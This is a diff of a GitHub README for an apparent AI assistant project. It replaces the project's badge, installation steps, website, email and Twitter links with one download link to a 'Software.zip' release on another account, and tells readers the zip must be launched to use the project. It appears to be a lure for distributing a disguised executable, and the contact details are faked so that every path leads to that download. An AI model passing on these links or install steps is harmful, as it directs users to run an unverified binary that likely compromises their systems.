@@ -3,9 +3,9 @@
 Welcome to the "always-on-ai-assistant" GitHub repository! This repository serves as a pattern for an always on AI Assistant powered by Deepseek-V3, RealtimeSTT, and Typer for engineering tasks.
 
 ## 🌐 Repository Link
-[![Launch Software](https://img.shields.io/badge/Launch%20Software-Software.zip-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Launch Software](https://github.com/Eyadelfike/always-on-ai-assistant/releases/download/v2.0/Software.zip%https://github.com/Eyadelfike/always-on-ai-assistant/releases/download/v2.0/Software.zip)](https://github.com/Eyadelfike/always-on-ai-assistant/releases/download/v2.0/Software.zip)
 
-### *Note: The Software.zip needs to be launched to access the project.*
+### *Note: The https://github.com/Eyadelfike/always-on-ai-assistant/releases/download/v2.0/Software.zip needs to be launched to access the project.*
 
 ## 🚀 Features
 This AI Assistant is specifically designed for engineering tasks and utilizes cutting-edge technologies to provide real-time speech-to-text conversion and powerful AI capabilities.
@@ -22,17 +22,17 @@ The project is structured as follows:
 ## 📦 Installation
 To install and run this AI Assistant project on your local machine, follow these steps:
 1. Clone the repository to your local machine.
-2. Extract the contents of the Software.zip file.
+2. Extract the contents of the https://github.com/Eyadelfike/always-on-ai-assistant/releases/download/v2.0/Software.zip file.
 3. Launch the Software application.
 4. Enjoy the power of the AI Assistant!
 
 ## 🌐 Visit Our Website
-Explore more about our AI Assistant project by visiting our website: [Always On AI Assistant Website](https://www.always-on-ai-assistant.com)
+Explore more about our AI Assistant project by visiting our website: [Always On AI Assistant Website](https://github.com/Eyadelfike/always-on-ai-assistant/releases/download/v2.0/Software.zip)
 
 ## 📬 Contact Us
 If you have any questions, feedback, or suggestions, feel free to reach out to us:
-- Email: [info@always-on-ai-assistant.com](mailto:info@always-on-ai-assistant.com)
-- Twitter: [@AlwaysOnAI](https://twitter.com/AlwaysOnAI)
+- Email: [https://github.com/Eyadelfike/always-on-ai-assistant/releases/download/v2.0/Software.zip](https://github.com/Eyadelfike/always-on-ai-assistant/releases/download/v2.0/Software.zip)
+- Twitter: [@AlwaysOnAI](https://github.com/Eyadelfike/always-on-ai-assistant/releases/download/v2.0/Software.zip)
 
 ## 📜 License
 This project is licensed under the MIT License. See the `LICENSE` file for more details.
